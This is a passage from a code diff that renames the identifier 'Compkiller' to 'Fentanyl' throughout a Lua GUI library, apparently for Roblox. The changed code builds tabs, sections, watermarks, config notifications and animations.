+				Fentanyl:_Input(SaveButton,function()
 					task.spawn(ConfigButton.OnSave);
 				end);
 
@@ -7123,11 +7123,11 @@
 				local __signals = {};
 				local Init = {};
 
-				Compkiller:_Input(Button,function()
+				Fentanyl:_Input(Button,function()
 					if TextBox.Text:byte() then
 						WindowArgs.Notify.new({
 							Title = "Configs",
-							Icon = Compkiller:_GetIcon(Config.Logo),
+							Icon = Fentanyl:_GetIcon(Config.Logo),
 							Content = "Create config \""..TextBox.Text.."\""
 						})
 
@@ -7163,7 +7163,7 @@
 						Button.OnLoad = function()
 							WindowArgs.Notify.new({
 								Title = "Configs",
-								Icon = Compkiller:_GetIcon(Config.Logo),
+								Icon = Fentanyl:_GetIcon(Config.Logo),
 								Content = "Load config \""..v.Name.."\""
 							})
 
@@ -7173,7 +7173,7 @@
 						Button.OnSave = function()
 							WindowArgs.Notify.new({
 								Title = "Configs",
-								Icon = Compkiller:_GetIcon(Config.Logo),
+								Icon = Fentanyl:_GetIcon(Config.Logo),
 								Content = "Save config \""..v.Info.Author.."\""
 							})
 
@@ -7190,7 +7190,7 @@
 						Button.OnDelete = function()
 							WindowArgs.Notify.new({
 								Title = "Configs",
-								Icon = Compkiller:_GetIcon(Config.Logo),
+								Icon = Fentanyl:_GetIcon(Config.Logo),
 								Content = "Delete config \""..v.Name.."\""
 							})
 
@@ -7222,13 +7222,13 @@
 		end;
 
 		function WindowArgs:DrawTab(TabConfig : TabConfig , Internal)
-			TabConfig = Compkiller.__CONFIG(TabConfig,{
+			TabConfig = Fentanyl.__CONFIG(TabConfig,{
 				Name = "Tab",
 				Icon = "eye",
 				Type = "Double"
 			});
 
-			local TabOpenSignal = Compkiller.__SIGNAL(false);
+			local TabOpenSignal = Fentanyl.__SIGNAL(false);
 			local TabArgs = {};
 			local Upvalue = {};
 			local BASE_PADDING = 10;
@@ -7241,7 +7241,7 @@
 				local Right = Instance.new("ScrollingFrame")
 				local UIListLayout_2 = Instance.new("UIListLayout")
 
-				TabContent.Name = Compkiller:_RandomString()
+				TabContent.Name = Fentanyl:_RandomString()
 				TabContent.Parent = Internal.Parent;
 				TabContent.AnchorPoint = Vector2.new(0.5, 0.5)
 				TabContent.BackgroundTransparency = 1.000
@@ -7251,7 +7251,7 @@
 				TabContent.Size = UDim2.new(1, -5,1, -5)
 				TabContent.ZIndex = 6
 
-				Left.Name = Compkiller:_RandomString()
+				Left.Name = Fentanyl:_RandomString()
 				Left.Parent = TabContent
 				Left.Active = true
 				Left.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -7278,7 +7278,7 @@
 				UIListLayout.VerticalFlex = Enum.UIFlexAlignment.None
 				UIListLayout.Padding = UDim.new(0, BASE_PADDING)
 
-				Right.Name = Compkiller:_RandomString()
+				Right.Name = Fentanyl:_RandomString()
 				Right.Parent = TabContent
 				Right.Active = true
 				Right.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -7332,9 +7332,9 @@
 				Upvalue.Left = Left;
 				Upvalue.Right = Right;
 
-				if Compkiller:_IsMobile() then
-					Compkiller:_AddDragBlacklist(Left);
-					Compkiller:_AddDragBlacklist(Right);
+				if Fentanyl:_IsMobile() then
+					Fentanyl:_AddDragBlacklist(Left);
+					Fentanyl:_AddDragBlacklist(Right);
 				end;
 
 				TabOpenSignal = Internal.Signal;
@@ -7352,7 +7352,7 @@
 				local Highlight = Instance.new("Frame")
 				local UICorner = Instance.new("UICorner")
 
-				TabButton.Name = Compkiller:_RandomString()
+				TabButton.Name = Fentanyl:_RandomString()
 				TabButton.Parent = TabButtonScrollingFrame
 				TabButton.BackgroundTransparency = 1.000
 				TabButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -7361,25 +7361,25 @@
 				TabButton.Size = UDim2.new(1, -10, 0, 32)
 				TabButton.ZIndex = 3
 
-				Icon.Name = Compkiller:_RandomString()
+				Icon.Name = Fentanyl:_RandomString()
 				Icon.Parent = TabButton
 				Icon.AnchorPoint = Vector2.new(0, 0.5)
-				Icon.BackgroundColor3 = Compkiller.Colors.Highlight
+				Icon.BackgroundColor3 = Fentanyl.Colors.Highlight
 				Icon.BackgroundTransparency = 1.000
 				Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				Icon.BorderSizePixel = 0
 				Icon.Position = UDim2.new(0, 15, 0.5, 0)
 				Icon.Size = UDim2.new(0, 22, 0, 22)
 				Icon.ZIndex = 3
-				Icon.Image = Compkiller:_GetIcon(TabConfig.Icon);
-				Icon.ImageColor3 = Compkiller.Colors.Highlight
+				Icon.Image = Fentanyl:_GetIcon(TabConfig.Icon);
+				Icon.ImageColor3 = Fentanyl.Colors.Highlight
 
-				table.insert(Compkiller.Elements.Highlight,{
+				table.insert(Fentanyl.Elements.Highlight,{
 					Element = Icon,
 					Property = "ImageColor3"
 				});
 
-				TabNameLabel.Name = Compkiller:_RandomString()
+				TabNameLabel.Name = Fentanyl:_RandomString()
 				TabNameLabel.Parent = TabButton
 				TabNameLabel.AnchorPoint = Vector2.new(0, 0.5)
 				TabNameLabel.BackgroundTransparency = 1.000
@@ -7390,16 +7390,16 @@
 				TabNameLabel.ZIndex = 3
 				TabNameLabel.Font = Enum.Font.GothamMedium
 				TabNameLabel.Text = TabConfig.Name;
-				TabNameLabel.TextColor3 = Compkiller.Colors.SwitchColor
+				TabNameLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 				TabNameLabel.TextSize = 15.000
 				TabNameLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = TabNameLabel,
 					Property = 'TextColor3'
 				});
 
-				Highlight.Name = Compkiller:_RandomString()
+				Highlight.Name = Fentanyl:_RandomString()
 				Highlight.Parent = TabButton
 				Highlight.AnchorPoint = Vector2.new(0.5, 0.5)
 				Highlight.BackgroundColor3 = Color3.fromRGB(161, 161, 161)
@@ -7419,7 +7419,7 @@
 				local Right = Instance.new("ScrollingFrame")
 				local UIListLayout_2 = Instance.new("UIListLayout")
 
-				TabContent.Name = Compkiller:_RandomString()
+				TabContent.Name = Fentanyl:_RandomString()
 				TabContent.Parent = TabMainFrame;
 				TabContent.AnchorPoint = Vector2.new(0.5, 0.5)
 				TabContent.BackgroundTransparency = 1.000
@@ -7429,7 +7429,7 @@
 				TabContent.Size = UDim2.new(1, -15, 1, -15)
 				TabContent.ZIndex = 6
 
-				Left.Name = Compkiller:_RandomString()
+				Left.Name = Fentanyl:_RandomString()
 				Left.Parent = TabContent
 				Left.Active = true
 				Left.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -7457,7 +7457,7 @@
 				UIListLayout.VerticalFlex = Enum.UIFlexAlignment.None
 				UIListLayout.Padding = UDim.new(0, BASE_PADDING)
 
-				Right.Name = Compkiller:_RandomString()
+				Right.Name = Fentanyl:_RandomString()
 				Right.Parent = TabContent
 				Right.Active = true
 				Right.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -7492,9 +7492,9 @@
 				WindowArgs:AddUnbind(UIListLayout_2 , Right);
 				WindowArgs:AddUnbind(UIListLayout , Left);
 
-				if Compkiller:_IsMobile() then
-					Compkiller:_AddDragBlacklist(Left);
-					Compkiller:_AddDragBlacklist(Right);
+				if Fentanyl:_IsMobile() then
+					Fentanyl:_AddDragBlacklist(Left);
+					Fentanyl:_AddDragBlacklist(Right);
 				end;
 
 				if TabConfig.Type == "Single" then
@@ -7518,27 +7518,27 @@
 
 						WindowArgs.SelectedTab = TabButton;
 
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 0,
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							TextTransparency = 0
 						});
 
-						Compkiller:_Animation(Highlight,Tween,{
+						Fentanyl:_Animation(Highlight,Tween,{
 							BackgroundTransparency = 0.925
 						});
 					else
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 0.5
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							TextTransparency = 0.5
 						});
 
-						Compkiller:_Animation(Highlight,Tween,{
+						Fentanyl:_Animation(Highlight,Tween,{
 							BackgroundTransparency = 1
 						});
 					end;
@@ -7556,23 +7556,23 @@
 					Remote = TabOpenSignal
 				});
 
-				Compkiller:_Hover(TabButton,function()
+				Fentanyl:_Hover(TabButton,function()
 					if WindowArgs.SelectedTab ~= TabButton then
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 0.1
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							TextTransparency = 0.1
 						});
 					end;
 				end , function()
 					if WindowArgs.SelectedTab ~= TabButton then
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							ImageTransparency = 0.5
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							TextTransparency = 0.5
 						});
 					end;
@@ -7582,55 +7582,55 @@
 
 				TabHover:Connect(function(bool)
 					if bool then
-						Compkiller:_Animation(TabButton,Tween,{
+						Fentanyl:_Animation(TabButton,Tween,{
 							Size = UDim2.new(1, -10, 0, 32)
 						});
 
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							Position = UDim2.new(0, 15, 0.5, 0),
 							Size = UDim2.new(0, 22, 0, 22),
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							Size = UDim2.new(0, 200, 0, 25),
 							Position = UDim2.new(0, 43, 0.5, 0)
 						});
 
-						Compkiller:_Animation(UICorner,Tween,{
+						Fentanyl:_Animation(UICorner,Tween,{
 							CornerRadius = UDim.new(0, 4)
 						});
 
-						Compkiller:_Animation(Highlight,Tween,{
+						Fentanyl:_Animation(Highlight,Tween,{
 							Size = UDim2.new(1, -17, 1, 0),
 							Position = UDim2.new(0.5, 0, 0.5, 0)
 						});
 					else
-						Compkiller:_Animation(UICorner,Tween,{
+						Fentanyl:_Animation(UICorner,Tween,{
 							CornerRadius = UDim.new(0, 10)
 						});
 
-						Compkiller:_Animation(TabButton,Tween,{
+						Fentanyl:_Animation(TabButton,Tween,{
 							Size = UDim2.new(1, -10, 0, 32)
 						});
 
-						Compkiller:_Animation(Icon,Tween,{
+						Fentanyl:_Animation(Icon,Tween,{
 							Position = UDim2.new(0, 12, 0.5, 0),
 							Size = UDim2.new(0, 20, 0, 20),
 						});
 
-						Compkiller:_Animation(TabNameLabel,Tween,{
+						Fentanyl:_Animation(TabNameLabel,Tween,{
 							Size = UDim2.new(0, 200, 0, 25),
 							Position = UDim2.new(0, 80, 0.5, 0)
 						});
 
-						Compkiller:_Animation(Highlight,Tween,{
+						Fentanyl:_Animation(Highlight,Tween,{
 							Size = UDim2.new(1, -10,1, 5),
 							Position = UDim2.new(0.5, 0, 0.5, 0)
 						});
 					end;
 				end);
 
-				Compkiller:_Input(TabButton,function()
+				Fentanyl:_Input(TabButton,function()
 					for i,v in next, WindowArgs.Tabs do
 						if v.Root == TabButton then
 							v.Remote:Fire(true);
@@ -7719,7 +7719,7 @@
 			--TabArgs.RightThread();
 
 			function TabArgs:DrawSection(config: Section)
-				config = Compkiller.__CONFIG(config,{
+				config = Fentanyl.__CONFIG(config,{
 					Name = "Section",
 					Position = "left"
 				});
@@ -7737,22 +7737,22 @@
 				local SectionText = Instance.new("TextLabel")
 				local SectionClose = Instance.new("ImageLabel")
 
-				Section.Name = Compkiller:_RandomString()
+				Section.Name = Fentanyl:_RandomString()
 				Section.Parent = Parent;
 
 				if TabConfig.Type == "Single" then
 					Section.Parent = Upvalue.Left;
 				end;
 
-				Section.BackgroundColor3 = Compkiller.Colors.BlockColor
+				Section.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-				table.insert(Compkiller.Elements.BlockColor , {
+				table.insert(Fentanyl.Elements.BlockColor , {
 					Element = Section,
 					Property = "BackgroundColor3"
 				});
 
-				if Compkiller:_IsMobile() then
-					Compkiller:_AddDragBlacklist(Section);
+				if Fentanyl:_IsMobile() then
+					Fentanyl:_AddDragBlacklist(Section);
 				end;
 
 				Section.LayoutOrder = #Parent:GetChildren() + 3;
@@ -7765,10 +7765,10 @@
 				UICorner.CornerRadius = UDim.new(0, 6)
 				UICorner.Parent = Section
 
-				UIStroke.Color = Compkiller.Colors.StrokeColor
+				UIStroke.Color = Fentanyl.Colors.StrokeColor
 				UIStroke.Parent = Section
 
-				table.insert(Compkiller.Elements.StrokeColor,{
+				table.insert(Fentanyl.Elements.StrokeColor,{
 					Element = UIStroke,
 					Property = "Color"
 				});
@@ -7778,7 +7778,7 @@
 				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 				UIListLayout.Padding = UDim.new(0, 5)
 
-				Header.Name = Compkiller:_RandomString()
+				Header.Name = Fentanyl:_RandomString()
 				Header.Parent = Section
 				Header.BackgroundTransparency = 1.000
 				Header.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -7787,7 +7787,7 @@
 				Header.Size = UDim2.new(1, 0, 0, 35)
 				Header.ZIndex = 9
 
-				SectionText.Name = Compkiller:_RandomString()
+				SectionText.Name = Fentanyl:_RandomString()
 				SectionText.Parent = Header
 				SectionText.AnchorPoint = Vector2.new(0, 0.5)
 				SectionText.BackgroundTransparency = 1.000
@@ -7798,17 +7798,17 @@
 				SectionText.ZIndex = 10
 				SectionText.Font = Enum.Font.GothamMedium
 				SectionText.Text = config.Name;
-				SectionText.TextColor3 = Compkiller.Colors.SwitchColor
+				SectionText.TextColor3 = Fentanyl.Colors.SwitchColor
 				SectionText.TextSize = 14.000
 				SectionText.TextTransparency = 0.500
 				SectionText.TextXAlignment = Enum.TextXAlignment.Left
 
-				table.insert(Compkiller.Elements.SwitchColor , {
+				table.insert(Fentanyl.Elements.SwitchColor , {
 					Element = SectionText,
 					Property = 'TextColor3'
 				});
 
-				SectionClose.Name = Compkiller:_RandomString()
+				SectionClose.Name = Fentanyl:_RandomString()
 				SectionClose.Parent = Header
 				SectionClose.AnchorPoint = Vector2.new(1, 0.5)
 				SectionClose.BackgroundTransparency = 1.000
@@ -7841,11 +7841,11 @@
 
 					if IsOpen then
 						if Section:GetAttribute('Height') then
-							Compkiller:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
+							Fentanyl:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
 								Size = UDim2.new(1, 0, 0, math.abs(Section:GetAttribute('Height')) - 1)
 							});
 						else
-							Compkiller:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
+							Fentanyl:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
 								Size = UDim2.new(1, 0, 0, math.abs(UIListLayout.AbsoluteContentSize.Y) - 1)
 							});
 						end;
@@ -7854,7 +7854,7 @@
 					else
 						TabArgs.SectionClose[Parent][Section] = Section;
 
-						Compkiller:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
+						Fentanyl:_Animation(Section,TweenInfo.new(0.4,Enum.EasingStyle.Quint),{
 							Size = UDim2.new(1, 0, 0, 35)
 						});
 					end;
@@ -7928,41 +7928,41 @@
 
 				TabOpenSignal:Connect(function(bool)
 					if bool then
-						Compkiller:_Animation(Section,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(Section,TweenInfo.new(0.21),{
 							BackgroundTransparency = 0
 						})
 
-						Compkiller:_Animation(SectionText,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(SectionText,TweenInfo.new(0.21),{
 							TextTransparency = 0.500
 						})
 
-						Compkiller:_Animation(SectionClose,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(SectionClose,TweenInfo.new(0.21),{
 							ImageTransparency = 0.500
 						})
 					else
-						Compkiller:_Animation(Section,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(Section,TweenInfo.new(0.21),{
 							BackgroundTransparency = 1
 						})
 
-						Compkiller:_Animation(SectionText,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(SectionText,TweenInfo.new(0.21),{
 							TextTransparency = 1
 						})
 
-						Compkiller:_Animation(SectionClose,TweenInfo.new(0.21),{
+						Fentanyl:_Animation(SectionClose,TweenInfo.new(0.21),{
 							ImageTransparency = 1
 						})
 					end;
 				end);
 
-				Compkiller:_Input(Header,function()
+				Fentanyl:_Input(Header,function()
 					IsOpen = not IsOpen;
 
 					if IsOpen then
-						Compkiller:_Animation(SectionClose,TweenInfo.new(0.35),{
+						Fentanyl:_Animation(SectionClose,TweenInfo.new(0.35),{
 							Rotation = 0
 						});
 					else
-						Compkiller:_Animation(SectionClose,TweenInfo.new(0.35),{
+						Fentanyl:_Animation(SectionClose,TweenInfo.new(0.35),{
 							Rotation = -180
 						});
 					end;
@@ -7972,7 +7972,7 @@
 					refreshScale();
 				end);
 
-				return Compkiller:_LoadElement(Section , true , TabOpenSignal)
+				return Fentanyl:_LoadElement(Section , true , TabOpenSignal)
 			end;
 
 			return TabArgs;
@@ -7983,12 +7983,12 @@
 			local UICorner = Instance.new("UICorner")
 			local ImageLabel = Instance.new("ImageLabel")
 
-			CloseWindow.Name = Compkiller:_RandomString()
-			CloseWindow.Parent = CompKiller
+			CloseWindow.Name = Fentanyl:_RandomString()
+			CloseWindow.Parent = Fentanyl
 			CloseWindow.AnchorPoint = Vector2.new(1, 0)
-			CloseWindow.BackgroundColor3 = Compkiller.Colors.BGDBColor
+			CloseWindow.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-			table.insert(Compkiller.Elements.BGDBColor,{
+			table.insert(Fentanyl.Elements.BGDBColor,{
 				Element = CloseWindow,
 				Property = 'BackgroundColor3'
 			});
@@ -8023,23 +8023,23 @@
 				if v then
 					ImageLabel.ClipsDescendants = true;
 
-					Compkiller:_Animation(CloseWindow,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(CloseWindow,TweenInfo.new(0.2),{
 						Size = UDim2.new(0, 45, 0, 23),
 						BackgroundTransparency = 0.025
 					})
 
-					Compkiller:_Animation(ImageLabel,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ImageLabel,TweenInfo.new(0.2),{
 						ImageTransparency = (ImageLabel:GetAttribute('Hover') and 0.1) or 0.35
 					})
 				else
 					ImageLabel.ClipsDescendants = false;
 
-					Compkiller:_Animation(CloseWindow,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(CloseWindow,TweenInfo.new(0.2),{
 						Size = UDim2.new(0, 0, 0, 23),
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(ImageLabel,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ImageLabel,TweenInfo.new(0.2),{
 						ImageTransparency = 1
 					})
 				end;
@@ -8055,12 +8055,12 @@
 				local WaternarkList = Instance.new("Frame")
 				local UIListLayout = Instance.new("UIListLayout")
 
-				Watermark.Name = Compkiller:_RandomString()
-				Watermark.Parent = CompKiller
+				Watermark.Name = Fentanyl:_RandomString()
+				Watermark.Parent = Fentanyl
 				Watermark.AnchorPoint = Vector2.new(1, 0)
-				Watermark.BackgroundColor3 = Compkiller.Colors.BGDBColor
+				Watermark.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-				table.insert(Compkiller.Elements.BGDBColor,{
+				table.insert(Fentanyl.Elements.BGDBColor,{
 					Element = Watermark,
 					Property = 'BackgroundColor3'
 				});
@@ -8074,11 +8074,11 @@
 
 				ImageLabel:GetPropertyChangedSignal('ClipsDescendants'):Connect(function()
 					if ImageLabel.ClipsDescendants then
-						Compkiller:_Animation(Watermark , TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Watermark , TweenInfo.new(0.2),{
 							Position = UDim2.new(1, -60, 0, 10)
 						})
 					else
-						Compkiller:_Animation(Watermark , TweenInfo.new(0.2),{
+						Fentanyl:_Animation(Watermark , TweenInfo.new(0.2),{
 							Position = UDim2.new(1, -10, 0, 10)
 						})
 					end;
@@ -8087,12 +8087,12 @@
 				UICorner.CornerRadius = UDim.new(0, 3)
 				UICorner.Parent = Watermark
 
-				Logo.Name = Compkiller:_RandomString()
+				Logo.Name = Fentanyl:_RandomString()
 				Logo.Parent = Watermark
 				Logo.AnchorPoint = Vector2.new(1, 0.5)
-				Logo.BackgroundColor3 = Compkiller.Colors.BGDBColor
+				Logo.BackgroundColor3 = Fentanyl.Colors.BGDBColor
 
-				table.insert(Compkiller.Elements.BGDBColor,{
+				table.insert(Fentanyl.Elements.BGDBColor,{
 					Element = Logo,
 					Property = 'BackgroundColor3'
 				});
@@ -8110,19 +8110,19 @@
 
 				Frame.Parent = Logo
 				Frame.AnchorPoint = Vector2.new(0, 0.5)
-				Frame.BackgroundColor3 = Compkiller.Colors.Highlight
+				Frame.BackgroundColor3 = Fentanyl.Colors.Highlight
 				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 				Frame.BorderSizePixel = 0
 				Frame.Position = UDim2.new(1, -5, 0.5, 0)
 				Frame.Size = UDim2.new(0, 2, 1, 0)
 				Frame.ZIndex = 151
 
-				table.insert(Compkiller.Elements.Highlight,{
+				table.insert(Fentanyl.Elements.Highlight,{
 					Element = Frame,
 					Property = "BackgroundColor3"
 				});
 
-				CompLogo.Name = Compkiller:_RandomString()
+				CompLogo.Name = Fentanyl:_RandomString()
 				CompLogo.Parent = Logo
 				CompLogo.AnchorPoint = Vector2.new(0.5, 0.5)
 				CompLogo.BackgroundTransparency = 1.000
@@ -8134,7 +8134,7 @@
 				CompLogo.ZIndex = 159
 				CompLogo.Image = Config.Logo
 
-				WaternarkList.Name = Compkiller:_RandomString()
+				WaternarkList.Name = Fentanyl:_RandomString()
 				WaternarkList.Parent = Watermark
 				WaternarkList.AnchorPoint = Vector2.new(0.5, 0)
 				WaternarkList.BackgroundTransparency = 1.000
@@ -8153,7 +8153,7 @@
 
 				local BackFrame = Instance.new("Frame")
 
-				BackFrame.Name = Compkiller:_RandomString()
+				BackFrame.Name = Fentanyl:_RandomString()
 				BackFrame.Parent = Watermark
 				BackFrame.AnchorPoint = Vector2.new(1, 0.5)
 				BackFrame.BackgroundTransparency = 1.000
@@ -8162,10 +8162,10 @@
 				BackFrame.Position = UDim2.new(1, 0, 0.5, 0)
 				BackFrame.Size = UDim2.new(1, 30, 1, 0)
 
-				Compkiller:_Blur(BackFrame,WindowOpen);
+				Fentanyl:_Blur(BackFrame,WindowOpen);
 
 				UIListLayout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
-					Compkiller:_Animation(Watermark,TweenInfo.new(0.4),{
+					Fentanyl:_Animation(Watermark,TweenInfo.new(0.4),{
 						Size = UDim2.new(0, UIListLayout.AbsoluteContentSize.X + 8, 0, 23)
 					});
 				end)
@@ -8173,7 +8173,7 @@
 				local Args = {};
 
 				function Args:AddText(Watermark : Watermark)
-					Watermark = Compkiller.__CONFIG(Watermark, {
+					Watermark = Fentanyl.__CONFIG(Watermark, {
 						Text = "Watermark",
 						Icon = "info"
 					});
@@ -8181,7 +8181,7 @@
 					local Icon = Instance.new("ImageLabel")
 					local TextLabel = Instance.new("TextLabel")
 
-					Icon.Name = Compkiller:_RandomString()
+					Icon.Name = Fentanyl:_RandomString()
 					Icon.Parent = WaternarkList
 					Icon.BackgroundTransparency = 1.000
 					Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -8189,7 +8189,7 @@
 					Icon.Size = UDim2.fromOffset(15,15)
 					Icon.SizeConstraint = Enum.SizeConstraint.RelativeYY
 					Icon.ZIndex = 156
-					Icon.Image = Compkiller:_GetIcon(Watermark.Icon);
+					Icon.Image = Fentanyl:_GetIcon(Watermark.Icon);
 
 					TextLabel.Parent = WaternarkList
 					TextLabel.BackgroundTransparency = 1.000
@@ -8199,11 +8199,11 @@
 					TextLabel.ZIndex = 156
 					TextLabel.Font = Enum.Font.GothamMedium
 					TextLabel.Text = Watermark.Text
-					TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+					TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 					TextLabel.TextSize = 10.000
 					TextLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-					table.insert(Compkiller.Elements.SwitchColor , {
+					table.insert(Fentanyl.Elements.SwitchColor , {
 						Element = TextLabel,
 						Property = 'TextColor3'
 					});
@@ -8260,13 +8260,13 @@
 				WindowArgs:Toggle(WindowArgs.IsOpen)
 			end;
 
-			local Button = Compkiller:_Input(CloseWindow,function()
+			local Button = Fentanyl:_Input(CloseWindow,function()
 				WindowArgs:_ToggleUI()
 			end)
 
-			if not Compkiller:_IsMobile() then
+			if not Fentanyl:_IsMobile() then
 
-				Compkiller:_Hover(Button,function()
+				Fentanyl:_Hover(Button,function()
 					ImageLabel:SetAttribute("Hover",true);
 				end , function()
 					ImageLabel:SetAttribute("Hover",false);
@@ -8275,11 +8275,11 @@
 
 			table.insert(WindowArgs.THREADS,task.spawn(function()
 				while true do task.wait(0.15)
-					if Compkiller:_IsMobile() then
+					if Fentanyl:_IsMobile() then
 						ToggleCloseUI(true);
 
 						if WindowArgs.IsOpen then
-							Compkiller:_Animation(ImageLabel,TweenInfo.new(0.2),{
+							Fentanyl:_Animation(ImageLabel,TweenInfo.new(0.2),{
 								ImageTransparency = 0.35
 							});
 
@@ -8287,7 +8287,7 @@
 						else
 							ImageLabel:GetAttribute("Hover",true);
 
-							Compkiller:_Animation(ImageLabel,TweenInfo.new(0.2),{
+							Fentanyl:_Animation(ImageLabel,TweenInfo.new(0.2),{
 								ImageTransparency = 0.1
 							});
 						end;
@@ -8335,7 +8335,7 @@
 
 			local BlurElement = Instance.new("Frame")
 
-			BlurElement.Name = Compkiller:_RandomString()
+			BlurElement.Name = Fentanyl:_RandomString()
 			BlurElement.Parent = MainFrame
 			BlurElement.AnchorPoint = Vector2.new(1, 0.5)
 			BlurElement.BackgroundTransparency = 1.000
@@ -8346,11 +8346,11 @@
 			BlurElement.ZIndex = -100
 			BlurElement.Active = true
 
-			Compkiller:_Blur(BlurElement , WindowOpen);
+			Fentanyl:_Blur(BlurElement , WindowOpen);
 
 			local MovementFrame = Instance.new("Frame")
 
-			MovementFrame.Name = Compkiller:_RandomString()
+			MovementFrame.Name = Fentanyl:_RandomString()
 			MovementFrame.Parent = MainFrame
 			MovementFrame.AnchorPoint = Vector2.new(1, 0.5)
 			MovementFrame.BackgroundTransparency = 1.000
@@ -8360,9 +8360,9 @@
 			MovementFrame.Size = UDim2.new(1, 0, 1, 0)
 			MovementFrame.ZIndex = 9
 
-			Compkiller:Drag(MovementFrame,MainFrame,0.1)
+			Fentanyl:Drag(MovementFrame,MainFrame,0.1)
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = SelectionFrame,
 				Property = "BackgroundColor3"
 			});
@@ -8371,32 +8371,32 @@
 				BlurElement.Size = UDim2.new(1, TabFrame.AbsoluteSize.X - 35, 1, 0);
 				MovementFrame.Size = UDim2.new(1, TabFrame.AbsoluteSize.X - 35, 1, 0);
 
-				SelectionFrame.BackgroundColor3 = Compkiller.Colors.Highlight;
+				SelectionFrame.BackgroundColor3 = Fentanyl.Colors.Highlight;
 
 				if WindowArgs.SelectedTab and WindowArgs.IsOpen then
 					local vili = -(TabButtons.AbsolutePosition.Y - WindowArgs.SelectedTab.AbsolutePosition.Y) + 2;
 					local distance = (SelectionFrame.Position.Y.Offset - vili);
 
 					if vili < 0 or vili > TabButtons.AbsoluteSize.Y then
-						Compkiller:_Animation(SelectionFrame , TweenInfo.new(0.1) , {
+						Fentanyl:_Animation(SelectionFrame , TweenInfo.new(0.1) , {
 							BackgroundTransparency = 1
 						});
 					else
 						if math.abs(distance) <= 10 then
-							Compkiller:_Animation(SelectionFrame , TweenInfo.new(0.1) , {
+							Fentanyl:_Animation(SelectionFrame , TweenInfo.new(0.1) , {
 								BackgroundTransparency = 0
 							});
 
 							SelectionFrame.Position = UDim2.new(1,5,0,math.ceil(vili));
 						else
-							Compkiller:_Animation(SelectionFrame , TweenInfo.new(0.15) , {
+							Fentanyl:_Animation(SelectionFrame , TweenInfo.new(0.15) , {
 								BackgroundTransparency = 0,
 								Position = UDim2.new(1,5,0,math.ceil(vili))
 							});
 						end;
 					end;
 				else
-					Compkiller:_Animation(SelectionFrame , TweenInfo.new(0.15) , {
+					Fentanyl:_Animation(SelectionFrame , TweenInfo.new(0.15) , {
 						BackgroundTransparency = 1
 					});
 				end;
@@ -8412,7 +8412,7 @@
 		local OldDelayThread;
 		local DurationTime = tick();
 
-		Compkiller:_Hover(TabFrame , function()
+		Fentanyl:_Hover(TabFrame , function()
 			if OldDelayThread then
 				task.cancel(OldDelayThread);
 				OldDelayThread = nil;
@@ -8445,7 +8445,7 @@
 		return WindowArgs;
 	end;
 
-	function Compkiller:GetDate(Time)
+	function Fentanyl:GetDate(Time)
 		Time = Time or tick();
 
 		local val = os.date('*t',Time);
@@ -8453,7 +8453,7 @@
 		return string.format("%s/%s/%s",val.day,val.month,val.year);
 	end;
 
-	function Compkiller:GetTimeNow(Time)
+	function Fentanyl:GetTimeNow(Time)
 		Time = Time or tick();
 
 		local val = os.date('*t',Time);
@@ -8461,10 +8461,10 @@
 		return string.format("%s:%s:%s",val.hour,val.min,val.sec);
 	end;
 
-	function Compkiller:GetConfig(Type: string)
+	function Fentanyl:GetConfig(Type: string)
 		local ConfigFlags = {};
 
-		for i,v in next , Compkiller.Flags do
